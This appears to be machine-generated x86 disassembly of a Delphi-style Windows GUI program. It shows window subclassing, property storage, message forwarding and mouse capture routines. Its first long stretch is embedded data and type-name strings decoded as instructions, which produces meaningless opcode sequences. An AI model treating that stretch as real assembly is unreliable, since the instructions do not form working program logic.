imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
nop
nop
pop esp
js r-xdata
retn 0x44
add [ eax + 0x40040d4 ] bl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
dec ebp
popad
popad
imul ebp [ esi + 0x74 ] 0x90909073
insb
jns r-xdata
add [ esi + ecx * 8 ] ch
inc ebx
add [ ecx * 8 - 0x4f87ffbd ] cl
inc edx
add [ ecx ] al
add ch bh
[ edx + esi * 4 + 0x42 ]
imul ebp [ esi + 0x74 ] 0x657a6953
add eax 0x0
inc esp
add [ eax + eax * 8 ] al
inc esp
add [ eax ] bl
rol [ eax + eax - 0x30 ] 0xcc
inc ebx
add al cl
outsd
insd
sar [ eax + 0x42 ] 0x0
push es
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
add [ esi ] al
add [ ecx ] al
inc esp
add [ ebx + esi * 4 + 0x49400042 ] dh
inc eax
add [ eax ] bh
mov ah 0x42
add [ eax - 0x7bffbfb7 ] cl
mov ah 0x42
add al dl
dec ecx
inc eax
add ah dh
dec ecx
inc eax
add al dl
mov ah 0x42
add [ eax - 0x4b ] dl
inc edx
add [ edx + ecx * 2 + 0x40 ] cl
add [ ebp + esi * 4 + 0x42 ] bh
add [ edx + ecx * 2 + 0x40 ] ch
add [ eax - 0x73ffbd4b ] ch
dec edx
inc eax
add [ edx + ecx * 2 - 0x4a27ffc0 ] bl
inc edx
add [ edx + esi * 4 + 0x54120042 ] dh
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
cmp [ ecx + 0x10042 ] dh
add [ eax ] al
add al [ eax ]
or [ ebp + 0x61 ] ecx
js r-xdata
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
mov al 0x42
add [ eax - 0x6fffbd88 ] eax
aam 0x78
inc edx
add [ ecx ] al
andps xmm0 [ ebx + 0x6f ]
add [ eax + 0x77809090 ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
ja r-xdata
outsb
jb r-xdata
inc ebp
jbe r-xdata
je r-xdata
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
add [ eax + eax ] dl
add bh bh
cmp [ ecx + 0x10042 ] dh
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esp [ edi + 0x68 ] 0x4278d074
js r-xdata
imul esp [ gs : edi + 0x68 ] 0x4278d074
add [ eax + eax ] cl
add bh bh
cmp [ ecx + 0x10042 ] dh
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
or [ ebp + 0x61 ] cl
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
sub eax 0x2e4c0044
add [ eax + eax ] bl
add [ eax ] al
fadd [ eax + 0x40 ]
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ 0x66696853 ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
inc ebp
jbe r-xdata
outsb
je r-xdata
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
sar [ eax + 0x42 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x4278d074
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
push esp
push ebx
push 0x53746669
jns r-xdata
je r-xdata
outsd
jb r-xdata
outsb
je r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ ecx + 0x7 ] ebx
je r-xdata
je r-xdata
js r-xdata
imul ebp [ esi + 0x74 ] 0x42793c73
add [ eax ] dh
movsb [ edi ] [ esi ]
inc ebx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
push es
push ebx
outsb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc ebp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ 0x66696853 ] al
je r-xdata
add al 0x8
push es
push ebx
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push 0x65
jb r-xdata
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push ebx
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
je r-xdata
add [ eax ] dl
add [ eax ] al
inc edx
outsd
insb
jae r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
arpl [ ecx + eax + 0x3 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
pop es
add [ ecx + 0x7 ] ebx
jae r-xdata
je r-xdata
outsb
je r-xdata
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
arpl [ ebp + 0x7 ] sp
nop
nop
sbb al 0x7b
inc edx
add [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
dec esp
jpo r-xdata
inc ebx
push 0x7b4c7261
je r-xdata
jpe r-xdata
or [ ecx ] cl
push esp
dec ebx
jns r-xdata
jb r-xdata
je r-xdata
inc edx
jne r-xdata
jpe r-xdata
nop
nop
nop
sub [ edx + 0x42 ] bh
add [ eax ] cl
add [ eax ] al
add al dl
js r-xdata
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
arpl [ ebp + 0x7 ] sp
pop eax
pop es
dec ecx
outsb
je r-xdata
arpl [ gs : eax + eax + 0x1 ] si
jb r-xdata
jb r-xdata
jb r-xdata
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push ebx
outsb
jb r-xdata
je r-xdata
dec ecx
outsb
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
popad
outsb
nop
nop
mov esp 0x800427b
dec edi
jbe r-xdata
push cs
push esp
dec ebx
jns r-xdata
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
jbe r-xdata
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
dec ecx
outsb
je r-xdata
add [ ecx ] al
pop ecx
pop es
je r-xdata
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
jne r-xdata
add al 0x8
push es
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add eax 0x74617453
jl r-xdata
je r-xdata
or [ esi ] al
push esp
popad
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
arpl [ gs : eax + eax + 0x1 ] si
pop es
inc esp
jb r-xdata
push cs
push esp
add [ eax ] cl
jb r-xdata
inc edx
outsb
je r-xdata
add [ ebx ] al
or [ esi ] al
jb r-xdata
outsb
add [ 0x66696853 ] al
je r-xdata
push 0xb746669
dec ebp
outsd
jbe r-xdata
arpl [ gs : eax + ecx + 0x6 ] si
jb r-xdata
or eax 0x646e4554
inc esp
jb r-xdata
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
push ebx
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
jb r-xdata
je r-xdata
jl r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
push ebx
outsb
jb r-xdata
add ecx [ eax ]
push es
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
add eax [ eax ]
or [ ebp + 0x69 ] cl
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x28909090
jpe r-xdata
nop
nop
push esp
push ebx
push 0x53746669
jns r-xdata
popad
push 0x65
inc ebp
jbe r-xdata
add [ ecx ] al
pop ecx
pop es
inc esp
jb r-xdata
jb r-xdata
jb r-xdata
pop es
inc edx
outsd
outsd
insb
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx ] al
pop eax
push esp
dec edi
jb r-xdata
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x48 ] si
jl r-xdata
jbe r-xdata
push ebx
je r-xdata
inc esp
jb r-xdata
outsb
je r-xdata
push edi
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
jne r-xdata
outsb
jb r-xdata
jb r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
inc ebp
jbe r-xdata
inc esp
jb r-xdata
or [ edx ] ecx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
je r-xdata
jb r-xdata
inc edx
jb r-xdata
outsd
jne r-xdata
jo r-xdata
jl r-xdata
jbe r-xdata
outsb
je r-xdata
add [ eax ] cl
popad
outsb
je r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
je r-xdata
jb r-xdata
pop eax
pop es
dec ecx
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
jbe r-xdata
jb r-xdata
xchg esp eax
pop es
dec ecx
outsb
je r-xdata
outsb
je r-xdata
add eax 0x6f6c6c41
je r-xdata
je r-xdata
popad
outsb
nop
jb r-xdata
dec ecx
add [ ecx + 0x7 ] ebx
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
jb r-xdata
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
arpl [ gs : eax + ecx + 0x6 ] si
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
ja r-xdata
add [ 0x6f6c6c41 ] eax
push esp
outsd
insb
or [ ecx ] cl
dec esi
ja r-xdata
jb r-xdata
je r-xdata
nop
pushad
jge r-xdata
outsb
je r-xdata
add cl [ eax ]
push es
push ebx
outsb
nop
mov esp 0x800427d
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
inc edx
outsd
outsd
insb
popad
outsb
pop es
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
dec ecx
outsb
je r-xdata
add [ eax + 0x7 ] ebx
inc ebx
outsd
outsb
add [ eax ] cl
or al 0x54
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
pop es
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
push esp
andps xmm0 [ edx + esi * 2 + 0x61 ]
popad
jb r-xdata
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
je r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
outsd
insb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
outsb
outsd
insb
push ebx
outsb
jb r-xdata
outsb
je r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push ebx
outsd
or [ esi ] al
arpl [ eax + ecx + 0x6 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
outsb
add [ eax ] cl
je r-xdata
popad
push ebx
or dl [ esp + eax * 2 + 0x72 ]
push ebx
or [ esi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
outsb
je r-xdata
arpl [ ebp + 0x52 ] sp
outsb
je r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
jb r-xdata
inc edx
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
outsb
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
aam 0x7e
inc edx
add [ eax ] cl
pop ss
push esp
inc ebx
outsd
outsb
push eax
outsd
jae r-xdata
jb r-xdata
jb r-xdata
adc [ 0x6c666e49 ] ecx
jne r-xdata
outsd
outsb
je r-xdata
push esp
inc ebx
add cl [ eax ]
push es
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
push edx
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
or [ esi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
outsb
jpe r-xdata
jb r-xdata
add eax 0x65530608
outsb
or [ eax ] dl
push esp
dec ebp
outsd
jb r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
nop
nop
nop
js r-xdata
add [ edi ] eax
inc ebx
popad
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
dec ebp
outsd
jne r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 ] si
jle r-xdata
je r-xdata
jb r-xdata
add eax 0x65530608
outsb
jbe r-xdata
inc ebp
jbe r-xdata
jae r-xdata
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
je r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
add [ eax ] ecx
je r-xdata
dec ecx
outsb
add [ gs : edx ] cl
jb r-xdata
arpl [ ecx + eax + 0x8 ] si
push 0x65
imul esp [ gs : edi + 0x68 ] 0x6e490774
je r-xdata
add eax 0x66696853
outsb
je r-xdata
je r-xdata
push edi
push ss
push esp
dec ebp
outsd
jne r-xdata
outsb
je r-xdata
je r-xdata
jb r-xdata
je r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
je r-xdata
pop es
dec ecx
outsb
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
jb r-xdata
jb r-xdata
push edi
push 0x446c6565
insb
add [ edx ] cl
push esp
push ebx
push 0x53746669
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x7f ] dl
inc edx
add ah ch
add [ edx ] 0x20
outsd
jo r-xdata
insb
outsd
ja r-xdata
or [ esi ] al
push 0x556c6565
jo r-xdata
push edi
add eax 0x65530608
outsb
jb r-xdata
dec eax
popad
pop es
jae r-xdata
nop
nop
push eax
jg r-xdata
outsb
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jb r-xdata
push edx
jae r-xdata
push es
pop es
je r-xdata
add [ eax ] ecx
dec esi
ja r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
add ah ah
jo r-xdata
add [ eax ] eax
add ah dh
mov ah 0x43
add [ esp + ebp ] bh
inc esp
js r-xdata
jb r-xdata
inc ebp
jbe r-xdata
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
je r-xdata
add [ 0x66696853 ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
je r-xdata
jne r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
push ebx
outsb
jb r-xdata
push es
outsb
je r-xdata
popad
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
add [ eax ] al
inc eax
push eax
outsd
jae r-xdata
pop es
je r-xdata
add [ edi ] eax
or [ ebp + 0x6f ] cl
jne r-xdata
dec ecx
outsb
je r-xdata
jpe r-xdata
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
fadd [ edx ]
aam 0xdd
inc edx
add [ ebx + eax * 8 ] al
inc edx
add [ edx + eax * 8 ] ah
inc edx
add [ eax ] ah
iretd
add [ eax + eax * 8 ] al
inc esp
add [ eax ] bl
rol [ eax + eax + 0x50 ] 0xb7
inc edx
add [ ecx + esi * 8 - 0x1ccfffbe ] dh
inc edx
add [ ecx * 8 - 0xe8bffbd ] cl
inc edx
add [ edx ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edx
add [ edx ] r-xdata
and [ ecx ] al
add [ eax ] al
hlt
jbe r-xdata
loope r-xdata
inc esp
add [ eax - 0x1bffbb3e ] ch
push eax
add ah cl
mov ebx 0xbb200042
inc edx
add [ esi + eax * 8 + 0x2c840042 ] bh
inc esp
add ah bh
daa
inc esp
add al ah
daa
inc esp
add [ esp + ebp - 0x49cbffbc ] bl
inc edx
add al bl
fadd [ edx ]
mov esp 0xd40042dc
fld [ edx ]
add al 0xc3
add [ ecx + esi * 8 + 0x42 ] dh
push eax
outsd
jae r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
nop
sub [ eax + 0x12080042 ] al
push esp
inc ebx
outsd
outsb
je r-xdata
add [ edi ] eax
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
pop es
inc edx
outsd
outsd
insb
popad
outsb
mov esp 0x4280
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7f ] al
inc edx
add [ eax + 0x72 ] bh
inc edx
dec eax
popad
push eax
outsd
jae r-xdata
jb r-xdata
jb r-xdata
push 0x746e4907
add [ eax + 0x100044c2 ] ah
and al [ eax + eax - 0x58 ]
retn 0x44
outsb
je r-xdata
dec eax
popad
add [ edi ] eax
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
add [ 0x66696853 ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
nop
nop
nop
les edi [ edi + 0x42 ]
add [ eax ] cl
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
add ecx [ eax ]
sub_428424
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ebp - 0x7823ffbe ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
test [ edx ] eax
0x4287
sub_42845c
test al 0x16
inc ebx
add [ eax + eax * 8 ] al
inc esp
add [ eax ] bl
rol [ eax + eax + 0x20 ] 0xf8
inc edx
add [ eax + 0x55 ] ch
inc ebx
add [ eax ] dh
jecxz r-xdata
mov eax 0xb8500042
inc edx
add [ ebx + esi * 8 - 0xc27ffbe ] dl
inc edx
add [ edx + edi * 4 - 0x3773ffbe ] dh
inc edx
add ah cl
mov [ edx ] sub_42cd20
cwde
0x42
add [ ecx * 8 - 0xe8bffbd ] cl
inc edx
add ah cl
mov ebx 0xfa300042
inc edx
add [ esi + eax * 8 + 0x2c840042 ] bh
inc esp
add ah bh
daa
inc esp
add al ah
daa
inc esp
add [ esp + ebp - 0x933ffbc ] bl
inc edx
add [ edi + ecx * 2 + 0x43 ] bl
add [ eax - 0x7bffbcab ] ch
push esp
inc ebx
add [ eax + ecx * 2 ] dh
inc ebx
add [ eax + 0x48 ] ch
inc ebx
add [ eax + 0x44 ] bh
inc ebx
add [ eax ] bh
sub_4284d8
mov [ ebx + eax * 2 ] dl
add [ eax - 0xc ] bl
inc edx
add al ch
inc esp
inc ebx
add [ ebp + eax * 2 + 0x3f740043 ] dl
inc ebx
add [ ebp + eax * 2 + 0x43 ] ch
add [ eax - 0x3ffbd06 ] ch
add [ ebx ] al
mov al [ 0xffffffff9800430e ]
or [ ebx ] eax
hlt
sub_428bbc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x8c
inc edx
add [ eax + eax ] ah
add [ eax ] al
enter 0x44a5 0x0
xchg esp eax
retn 0x44
sub_428bf0
test al 0xc2
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
nop
nop
int3
sub_428dc0
test al 0xc2
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x18 ] 0x99
inc ebx
add [ esi ] al
push esp
dec ebp
outsd
jne r-xdata
nop
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x14c ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x15c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x15c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_428e90
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
movzx eax [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetPropA
mov [ ebp - 0x8 ] eax
sub_428ec0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x24 ]
push eax
call SendMessageA
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_42909b
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x8b550000
in al dx
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x15
mov ecx rw-data
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43be9c
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_4290d0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x15
mov ecx rw-data
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43be3c
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_4290f8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_4484f4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44cf68
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_44cb34
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_42914c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_4484f4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0xc ]
inc edx
mov ecx 0x7fffffff
mov eax [ ebp - 0x4 ]
call sub_44cf68
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_44cb34
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_4291a0
push ebp
mov ebp esp
push ecx
call GetCapture
call sub_428e90
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x24 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
sub_4291dc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SetCapture
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x4 ] eax
sub_42929c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov [ ebp - 0xd ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x8 ]
jl r-xdata
mov edx [ ebp - 0xc ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_43c464
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
sete [ ebp - 0xd ]
cmp [ ebp - 0xd ] 0x0
jne r-xdata
mov al [ ebp - 0xd ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
inc [ eax ]
sub_4292f0
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_434714
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
call GetParent
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_429330
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax 0x8
call sub_44ba5c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
